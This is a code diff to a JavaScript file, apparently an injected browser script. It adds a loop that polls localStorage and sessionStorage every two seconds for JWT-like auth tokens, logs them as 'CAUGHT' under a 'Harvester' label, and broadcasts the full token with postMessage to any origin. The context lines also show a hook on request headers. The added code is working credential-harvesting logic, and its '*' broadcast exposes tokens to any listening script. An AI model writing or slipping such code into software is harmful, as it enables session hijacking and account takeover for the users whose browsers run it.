@@ -37,3 +37,34 @@ XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
     }
     return originalSetRequestHeader.apply(this, arguments);
 };
+
+// Also proactively check localStorage in case they saved it securely there
+setInterval(() => {
+    try {
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const val = localStorage.getItem(key) || "";
+            if (val.length > 50 && val.includes('eyJ')) {
+                // To avoid spamming, only log the first time
+                if (!window._omnipart_harvested) {
+                    window._omnipart_harvested = true;
+                    console.log("[MOT Harvester] CAUGHT LOCALSTORAGE TOKEN!", val.substring(0, 15) + "...");
+                    window.postMessage({ type: 'OMNIPART_TOKEN_INTERCEPT', token: val }, '*');
+                }
+            }
+        }
+        
+        // Sometimes it's stored in sessionStorage
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            const val = sessionStorage.getItem(key) || "";
+            if (val.length > 50 && val.includes('eyJ')) {
+                if (!window._omnipart_harvested_session) {
+                    window._omnipart_harvested_session = true;
+                    console.log("[MOT Harvester] CAUGHT SESSIONSTORAGE TOKEN!", val.substring(0, 15) + "...");
+                    window.postMessage({ type: 'OMNIPART_TOKEN_INTERCEPT', token: val }, '*');
+                }
+            }
+        }
+    } catch (e) {}
+}, 2000);
